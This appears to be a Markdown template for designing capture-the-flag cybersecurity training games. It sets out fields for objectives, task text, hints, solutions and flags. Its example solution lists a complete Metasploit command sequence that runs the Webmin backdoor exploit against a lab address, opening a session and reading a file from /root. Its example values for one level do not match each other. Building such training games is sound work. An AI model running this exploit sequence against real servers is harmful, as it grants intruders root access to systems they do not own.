This is a template for your cybersecurity game designs.
Whenever you see something in [brackets], replace it with your content.

# [Title of your game]

[A short introduction (several sentences) to the story of your game goes here.]

[Below is a template for individual levels. Copy it as many times as you need.]

## Level [number]: [Title of the level]

**Objective** (*visible only to the designer, never to the player*):

One sentence about the goal of the level. Answers the question "What should the player achieve in the level?"

The objective helps the designers and reviewers of the game design to gain a quick overview of the level.

Example: Scan the server to discover its open ports.

---
---

**Task assignment** (*visible to the player*):

Here, briefly describe the text that the player will see as the assignment.

This includes the description of the flag format.

Example:
You have acquired an IP address of a mysterious server: `172.18.1.5`. Scan it to find its open ports.
As a flag, submit the highest number of an open port.

**Hints** (*visible to the player if requested*):

Write down one or more hints to help the player if (s)he gets stuck during the level.

Each hint has a description and content.

Format: Hint [Number] ([Description]): [Content]

Example: Hint 1 (What tool to use?): Use the command-line tool **nmap**. Type `nmap --help` for more info.

**Solution** (*visible to the player if requested*):

A step-by-step description of the commands the player has to execute to complete the level.

Example:
```
root@attacker:~#  msfconsole
msf5 > search webmin
msf5 > use exploit/unix/webapp/webmin_backdoor
msf5 > show options
msf5 > set RHOST 172.18.1.5
msf5 > set LHOST 10.1.135.83
msf5 > set RPORT 10000
msf5 > check
msf5 > exploit
After this a new ssh session was created.
cd /root/
cat WARNING-READ-ME.txt
The flag is 25790
```

**Flag value** (*visible to the player if they solve the level*):

What should the player discover after successfully solving the level:

[A String with the resulting flag]

Example: CVE-2019-15107

---
---

**Estimated duration** (*visible only to the designer, never to the player*):

[Number] minutes (for the average player to complete the level)

**Learning outcomes** (*visible only to the designer, never to the player*):

What technical skills will the player achieve by solving the level?




## License

This work by [your names] is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0).